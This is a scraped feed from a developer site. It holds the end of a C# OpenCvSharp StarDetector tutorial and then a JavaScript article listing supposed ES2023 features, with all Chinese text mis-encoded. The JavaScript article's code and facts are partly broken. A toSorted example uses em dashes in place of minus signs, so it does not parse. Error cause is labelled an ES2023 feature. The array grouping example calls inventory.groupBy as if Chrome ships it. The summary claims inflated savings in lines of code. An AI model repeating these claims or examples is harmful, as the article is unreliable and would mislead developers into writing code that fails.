KeyPoint<span class="hljs-selector-attr">[]</span> keypoints = detector<span class="hljs-selector-class">.Detect</span>(imgGray);

<span class="hljs-comment">// åœ¨å›¾åƒä¸Šç»˜åˆ¶æ£€æµ‹åˆ°çš„ç‰¹å¾ç‚¹</span>
if (keypoints != null)
{
   <span class="hljs-selector-tag">var</span> <span class="hljs-attribute">color</span> = new <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// ç»¿è‰²</span>
   foreach (KeyPoint kpt in keypoints)
   {
       <span class="hljs-attribute">float</span> r = kpt<span class="hljs-selector-class">.Size</span> / <span class="hljs-number">2</span>;
       Cv2<span class="hljs-selector-class">.Circle</span>(imgDst, (Point)kpt<span class="hljs-selector-class">.Pt</span>, (int)r, <span class="hljs-attribute">color</span>);
       Cv2<span class="hljs-selector-class">.Line</span>(imgDst,
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y + r),
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y - r),
           <span class="hljs-attribute">color</span>);
       Cv2<span class="hljs-selector-class">.Line</span>(imgDst,
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y + r),
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y - r),
           <span class="hljs-attribute">color</span>);
   }
}
</code></pre>
<p>ä½¿ç”¨è¿‡ç¨‹å°±æ˜¯è¯»å–å›¾åƒã€è½¬æ¢ä¸ºç°åº¦å›¾åƒã€ä½¿ç”¨StarDetectorç®—æ³•æ£€æµ‹ç‰¹å¾ç‚¹ä¸åœ¨å›¾åƒä¸Šç»˜åˆ¶æ£€æµ‹åˆ°çš„ç‰¹å¾ç‚¹ã€‚</p>
<p>æŸ¥çœ‹StarDetector.Createå‡½æ•°ç­¾åï¼š</p>
<pre><code class="hljs language-ini" lang="ini">public static StarDetector Create(
  int <span class="hljs-attr">maxSize</span> = <span class="hljs-number">45</span>, 
  int <span class="hljs-attr">responseThreshold</span> = <span class="hljs-number">30</span>, 
  int <span class="hljs-attr">lineThresholdProjected</span> = <span class="hljs-number">10</span>, 
  int <span class="hljs-attr">lineThresholdBinarized</span> = <span class="hljs-number">8</span>,
  int <span class="hljs-attr">suppressNonmaxSize</span> = <span class="hljs-number">5</span>)
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æ˜¯ OpenCV ä¸­ StarDetector ç±»çš„é™æ€å·¥å‚æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ª Star ç‰¹å¾æ£€æµ‹å™¨çš„å®ä¾‹ã€‚</p>



































<table><thead><tr><th>å‚æ•°å</th><th>é»˜è®¤å€¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>maxSize</td><td>45</td><td>æ§åˆ¶æ£€æµ‹çš„æœ€å¤§ç‰¹å¾ç‚¹å°ºå¯¸ï¼Œè¾ƒå¤§çš„å€¼å¯ä»¥æ£€æµ‹æ›´å¤§çš„ç‰¹å¾ç»“æ„</td></tr><tr><td>responseThreshold</td><td>30</td><td>å“åº”é˜ˆå€¼ï¼Œç”¨äºè¿‡æ»¤æ‰å“åº”å€¼ä½äºæ­¤é˜ˆå€¼çš„ç‰¹å¾ç‚¹ï¼Œæé«˜æ£€æµ‹è´¨é‡</td></tr><tr><td>lineThresholdProjected</td><td>10</td><td>æŠ•å½±çº¿é˜ˆå€¼ï¼Œç”¨äºæ§åˆ¶çº¿çŠ¶ç»“æ„çš„æ£€æµ‹çµæ•åº¦</td></tr><tr><td>lineThresholdBinarized</td><td>8</td><td>äºŒå€¼åŒ–çº¿é˜ˆå€¼ï¼Œè¿›ä¸€æ­¥ç»†åŒ–çº¿çŠ¶ç‰¹å¾çš„æ£€æµ‹æ ‡å‡†</td></tr><tr><td>suppressNonmaxSize</td><td>5</td><td>éæå¤§å€¼æŠ‘åˆ¶çš„é‚»åŸŸå¤§å°ï¼Œç”¨äºåœ¨å±€éƒ¨åŒºåŸŸå†…ä¿ç•™æœ€å¼ºçš„ç‰¹å¾ç‚¹</td></tr></tbody></table>
<p>æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c375170dd84499867bc6d37f9d894d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=ep%2B38VT0hZMuC08C8uCuJNjHMtQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript å¼€å‘è€…å¿…çŸ¥çš„ 7 ä¸ª ES2023 æ–°ç‰¹æ€§ï¼Œç¬¬5ä¸ªèƒ½è®©ä»£ç é‡å‡å°‘50%]]></title>    <link>https://juejin.cn/post/7583325900294766592</link>    <guid>https://juejin.cn/post/7583325900294766592</guid>    <pubDate>2025-12-15T00:17:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583325900294766592" data-draft-id="7583507286317481984" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript å¼€å‘è€…å¿…çŸ¥çš„ 7 ä¸ª ES2023 æ–°ç‰¹æ€§ï¼Œç¬¬5ä¸ªèƒ½è®©ä»£ç é‡å‡å°‘50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-15T00:17:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript å¼€å‘è€…å¿…çŸ¥çš„ 7 ä¸ª ES2023 æ–°ç‰¹æ€§ï¼Œç¬¬5ä¸ªèƒ½è®©ä»£ç é‡å‡å°‘50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T00:17:15.000Z" title="Mon Dec 15 2025 00:17:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    36
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>JavaScript å¼€å‘è€…å¿…çŸ¥çš„ 7 ä¸ª ES2023 æ–°ç‰¹æ€§ï¼Œç¬¬5ä¸ªèƒ½è®©ä»£ç é‡å‡å°‘50%</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>ES2023ï¼ˆECMAScript 2023ï¼‰æ˜¯ JavaScript è¯­è¨€çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¸¦æ¥äº†å¤šé¡¹å®ç”¨ä¸”å¼ºå¤§çš„æ–°ç‰¹æ€§ã€‚è¿™äº›ç‰¹æ€§ä¸ä»…æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè¿˜ä¼˜åŒ–äº†ä»£ç çš„å¯è¯»æ€§å’Œæ€§èƒ½ã€‚æœ¬æ–‡å°†æ·±å…¥è§£æå…¶ä¸­ 7 ä¸ªæœ€é‡è¦çš„æ–°ç‰¹æ€§ï¼Œå°¤å…¶æ˜¯ç¬¬ 5 ä¸ªç‰¹æ€§ï¼Œå®ƒèƒ½å¤Ÿæ˜¾è‘—å‡å°‘ä»£ç é‡ï¼Œè®©å¼€å‘æ›´åŠ é«˜æ•ˆã€‚æ— è®ºä½ æ˜¯å‰ç«¯å¼€å‘è€…è¿˜æ˜¯å…¨æ ˆå·¥ç¨‹å¸ˆï¼ŒæŒæ¡è¿™äº›ç‰¹æ€§éƒ½å°†ä¸ºä½ çš„é¡¹ç›®å¸¦æ¥è´¨çš„é£è·ƒã€‚</p>
<hr/>
<h3 data-id="heading-2">1. Array.prototype.findLast() å’Œ findLastIndex()</h3>
<p>ES2023 ä¸ºæ•°ç»„æ–°å¢äº†ä¸¤ä¸ªæ–¹æ³•ï¼š<code>findLast()</code> å’Œ <code>findLastIndex()</code>ã€‚å®ƒä»¬çš„ä½œç”¨æ˜¯ä»æ•°ç»„çš„æœ«å°¾å¼€å§‹æŸ¥æ‰¾å…ƒç´ ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„ä»å¼€å¤´æŸ¥æ‰¾ã€‚</p>
<h4 data-id="heading-3">ä½¿ç”¨åœºæ™¯</h4>
<p>å‡è®¾æœ‰ä¸€ä¸ªæ•°ç»„ <code>[1, 2, 3, 4, 5, 2]</code>ï¼Œä½ æƒ³æ‰¾åˆ°æœ€åä¸€ä¸ªå€¼ä¸º <code>2</code> çš„å…ƒç´ æˆ–å…¶ç´¢å¼•ã€‚åœ¨ ES2023 ä¹‹å‰ï¼Œä½ éœ€è¦æ‰‹åŠ¨é€†åºéå†æ•°ç»„æˆ–ä½¿ç”¨ <code>Array.reverse()</code>ï¼Œç°åœ¨å¯ä»¥ç›´æ¥è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>];
<span class="hljs-keyword">const</span> lastTwo = arr.<span class="hljs-title function_">findLast</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item === <span class="hljs-number">2</span>); <span class="hljs-comment">// 2</span>
<span class="hljs-keyword">const</span> lastTwoIndex = arr.<span class="hljs-title function_">findLastIndex</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item === <span class="hljs-number">2</span>); <span class="hljs-comment">// 5</span>
</code></pre>
<h4 data-id="heading-4"><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong></h4>
<ul>
<li><strong>é¿å…æ‰‹åŠ¨é€†åºéå†</strong>ï¼šç®€åŒ–äº†ä»åå‘å‰æŸ¥æ‰¾çš„é€»è¾‘ã€‚</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šæ— éœ€åˆ›å»ºåè½¬æ•°ç»„çš„å‰¯æœ¬ï¼ˆ<code>reverse()</code>ä¼šä¿®æ”¹åŸæ•°ç»„ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5">2. Hashbang Grammarï¼ˆShebangï¼‰æ”¯æŒ</h3>
<p>ES2023 æ­£å¼æ”¯æŒ Hashbangï¼ˆå³ <code>#!</code>ï¼‰è¯­æ³•ï¼Œä½¿å¾— JavaScript æ–‡ä»¶å¯ä»¥ç›´æ¥ä½œä¸ºè„šæœ¬è¿è¡Œã€‚</p>
<h4 data-id="heading-6"><strong>ç¤ºä¾‹</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">#!/usr/bin/env node</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello from a Node.js script!"</span>);
</code></pre>
<h4 data-id="heading-7"><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong></h4>
<ul>
<li><strong>æ ‡å‡†åŒ–è„šæœ¬æ‰§è¡Œ</strong>ï¼šè®© JavaScript CLIå·¥å…·çš„å¼€å‘æ›´åŠ è§„èŒƒåŒ–ã€‚</li>
<li><strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼šUnix/Linuxç³»ç»Ÿå¯ä»¥ç›´æ¥è¯†åˆ«å¹¶æ‰§è¡Œå¸¦æœ‰Shebangçš„è„šæœ¬ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-8">3. Symbols as WeakMap Keys</h3>
<p>ES2023å…è®¸å°†<code>Symbol</code>ä½œä¸º<code>WeakMap</code>çš„é”®å€¼ï¼Œè¿™ä¸ºå…ƒç¼–ç¨‹å’Œå†…å­˜ç®¡ç†æä¾›äº†æ›´å¤šå¯èƒ½æ€§ã€‚</p>
<h4 data-id="heading-9"><strong>ç¤ºä¾‹</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> weakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
<span class="hljs-keyword">const</span> key = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'privateData'</span>);
weakMap.<span class="hljs-title function_">set</span>(key, { <span class="hljs-attr">secret</span>: <span class="hljs-string">'123'</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// { secret: '123' }</span>
</code></pre>
<h4 data-id="heading-10"><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong></h4>
<ul>
<li><strong>éšç§ä¿æŠ¤</strong>ï¼šSymbolä½œä¸ºé”®å¯ä»¥é˜²æ­¢å¤–éƒ¨ç›´æ¥è®¿é—®æ•°æ®ã€‚</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šWeakMapä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶å™¨å›æ”¶é”®å¯¹è±¡çš„å†…å­˜ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-11">4. Array.prototype.toReversed(), toSorted(), toSpliced(), and with()</h3>
<p>ES2023æ–°å¢äº†å››ä¸ªéç ´åæ€§æ•°ç»„æ–¹æ³•ï¼Œå®ƒä»¬ä¸ä¼šä¿®æ”¹åŸæ•°ç»„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„å‰¯æœ¬ã€‚</p>






























<table><thead><tr><th>æ–¹æ³•</th><th>ä½œç”¨</th><th>ä¼ ç»Ÿæ–¹å¼å¯¹æ¯”</th></tr></thead><tbody><tr><td><code>toReversed()</code></td><td>è¿”å›é€†åºæ•°ç»„</td><td><code>[...arr].reverse()</code></td></tr><tr><td><code>toSorted()</code></td><td>è¿”å›æ’åºåçš„æ•°ç»„</td><td><code>[...arr].sort()</code></td></tr><tr><td><code>toSpliced(start, deleteCount, ...items)</code></td><td>è¿”å›æ‹¼æ¥åçš„æ•°ç»„</td><td>æ‰‹åŠ¨å¤åˆ¶å¹¶æ“ä½œ</td></tr><tr><td><code>with(index, value)</code></td><td>æ›¿æ¢æŒ‡å®šä½ç½®çš„å…ƒç´ å¹¶è¿”å›æ–°æ•°ç»„</td><td>æ‰‹åŠ¨å¤åˆ¶å¹¶èµ‹å€¼</td></tr></tbody></table>
<h4 data-id="heading-12"><strong>ç¤ºä¾‹</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, â€”<span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> sorted = arr.<span class="hljs-title function_">toSorted</span>(); <span class="hljs-comment">// [â€”5,Â 1,Â 2]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [1,Â 2,â€”5] ï¼ˆåŸæ•°ç»„ä¸å˜ï¼‰</span>
</code></pre>
<h4 data-id="heading-13"><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong></h4>
<ul>
<li><strong>ä¸å¯å˜æ€§æ”¯æŒ</strong>ï¼šå‡½æ•°å¼ç¼–ç¨‹ä¸­æ›´å®‰å…¨åœ°æ“ä½œæ•°æ®ã€‚</li>
<li><strong>å‡å°‘é”™è¯¯</strong>ï¼šé¿å…æ„å¤–ä¿®æ”¹åŸæ•°ç»„çš„é—®é¢˜ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">5. #5: Records &amp; Tuples Proposal (StageÂ 2) â€”â€”ä»£ç é‡å‡å°‘50%çš„å…³é”®ï¼</h3>
<p>è¿™æ˜¯æœ¬æ–‡çš„é‡ç£…ç‰¹æ€§ï¼è™½ç„¶å®ƒç›®å‰å¤„äº StageÂ 2ï¼ˆå°šæœªæ­£å¼çº³å…¥ES2023ï¼‰ï¼Œä½†å·²ç»å¯ä»¥é€šè¿‡Babelæˆ–TypeScriptå°é²œä½¿ç”¨ã€‚å®ƒå¼•å…¥äº†ä¸¤ä¸ªæ–°çš„æ•°æ®ç»“æ„ï¼š<strong>Recordï¼ˆä¸å¯å˜å¯¹è±¡ï¼‰å’ŒTupleï¼ˆä¸å¯å˜æ•°ç»„ï¼‰</strong>ã€‚</p>
<h4 data-id="heading-15"><strong>æ ¸å¿ƒä¼˜åŠ¿</strong></h4>
<ul>
<li><strong>æ·±åº¦ä¸å¯å˜</strong>: Â æ•°æ®ä¸€æ—¦åˆ›å»ºå°±æ— æ³•ä¿®æ”¹ã€‚</li>
<li><strong>ç»“æ„å…±äº«</strong>: Â ç±»ä¼¼Immer.jsçš„æ€§èƒ½ä¼˜åŒ–ã€‚</li>
<li><strong>å€¼ç±»å‹æ¯”è¾ƒ</strong>: Â å¯ä»¥ç›´æ¥ç”¨ <code>===</code>æ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸åŒã€‚</li>
</ul>
<h4 data-id="heading-16"><strong>ç¤ºä¾‹</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Recordï¼ˆç±»ä¼¼å¯¹è±¡ï¼‰</span>
<span class="hljs-keyword">const</span> record = #{ <span class="hljs-attr">x</span>:Â <span class="hljs-number">1</span>,<span class="hljs-attr">y</span>:Â <span class="hljs-number">2</span> };
<span class="hljs-comment">// Tupleï¼ˆç±»ä¼¼æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">const</span> tuple = #[<span class="hljs-number">1</span>,<span class="hljs-string">"hello"</span>,<span class="hljs-literal">true</span>];
</code></pre>
<h4 data-id="heading-17"><strong>å®é™…åº”ç”¨</strong></h4>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå‡½æ•°éœ€è¦æ¯”è¾ƒä¸¤ä¸ªé…ç½®å¯¹è±¡æ˜¯å¦ç›¸åŒï¼š</p>
<h5 data-id="heading-18"><strong>ä¼ ç»Ÿæ–¹å¼</strong></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isEqual</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(a)===<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(b);
}
</code></pre>
<h5 data-id="heading-19"><strong>Records &amp; Tuplesæ–¹å¼</strong></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isEqual</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> a===b;
}
</code></pre>
<p>ä¸ä»…å¦‚æ­¤ï¼ŒReactç»„ä»¶çš„propsæ¯”è¾ƒã€Reduxçš„çŠ¶æ€ç®¡ç†ç­‰åœºæ™¯éƒ½å¯ä»¥å¤§å¹…ç®€åŒ–ï¼</p>
<h5 data-id="heading-20">Â ä¸ºä»€ä¹ˆèƒ½å‡å°‘50%ä»£ç é‡ï¼Ÿ</h5>
<ol>
<li>Â ä¸å†éœ€è¦æ·±æ‹·è´/æ·±æ¯”è¾ƒå·¥å…·å‡½æ•°ï¼ˆå¦‚lodash.isEqualï¼‰ã€‚</li>
<li>Â ä¸éœ€è¦Immutable.jsè¿™æ ·çš„ç¬¬ä¸‰æ–¹åº“ã€‚</li>
<li>Â ç®€åŒ–Reactçš„shouldComponentUpdateé€»è¾‘ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-21">6. Error Cause Chains (Errorå®ä¾‹æ–°å¢causeå±æ€§)</h3>
<p>ES2023å…è®¸åœ¨æŠ›å‡ºé”™è¯¯æ—¶é“¾å¼ä¼ é€’æ ¹æœ¬åŸå› ã€‚</p>
<h4 data-id="heading-22">Â ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span>{
    <span class="hljs-title function_">connectToDatabase</span>();
}<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Failed to initialize app"</span>,{ <span class="hljs-attr">cause</span>:err });
}
</code></pre>
<p>æ•è·æ—¶å¯ä»¥è®¿é—®å®Œæ•´çš„é”™è¯¯é“¾ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span>{
    <span class="hljs-title function_">initApp</span>();
}<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">cause</span>);<span class="hljs-comment">//åŸå§‹æ•°æ®åº“é”™è¯¯</span>
}
</code></pre>
<h4 data-id="heading-23">Â ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</h4>
<ul>
<li>Â æ›´å¥½çš„é”™è¯¯è°ƒè¯•ä½“éªŒã€‚</li>
<li>Â ä¿æŒå®Œæ•´çš„é”™è¯¯ä¸Šä¸‹æ–‡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-24">7. Array Grouping (StageÂ 3ææ¡ˆ)</h3>
<p>è™½ç„¶ä¸æ˜¯æ­£å¼æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œä½†Chromeå·²ç»å®ç°äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<p>é€šè¿‡groupByæ–¹æ³•å¯ä»¥è½»æ¾å®ç°SQLå¼çš„åˆ†ç»„æ“ä½œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> inventory=[
    {<span class="hljs-attr">name</span>:<span class="hljs-string">"asparagus"</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">"vegetables"</span>},
    {<span class="hljs-attr">name</span>:<span class="hljs-string">"bananas"</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">"fruit"</span>},
];
<span class="hljs-keyword">const</span> result=inventory.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function">(<span class="hljs-params">{type}</span>)=&gt;</span>type);
<span class="hljs-comment">/*ç»“æœ:
{
vegetables:[...],
fruit:[...]
}
*/</span>
</code></pre>
<p>å¯¹æ¯”ä¼ ç»Ÿæ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//ä»¥å‰éœ€è¦reduceå®ç°åˆ†ç»„...</span>
</code></pre>
<hr/>
<p>##æ€»ç»“</p>
<p>ES2023çš„æ–°ç‰¹æ€§è¦†ç›–äº†ä»æ•°æ®ç»“æ„åˆ°é”™è¯¯å¤„ç†ç­‰å¤šä¸ªæ–¹é¢ï¼š</p>
<p>âœ”ï¸Â findLast()è®©é€†å‘æŸ¥æ‰¾æ›´ç®€å•(20è¡Œâ†’1è¡Œ)<br/>
âœ”ï¸ Records/Tupleså¯èƒ½æ”¹å˜æˆ‘ä»¬å¤„ç†ä¸å¯å˜æ•°æ®çš„æ–¹å¼(100è¡Œâ†’50è¡Œ)<br/>
âœ”ï¸ Error Causeè®©é”™è¯¯å¤„ç†æ›´ä¸“ä¸š</p>
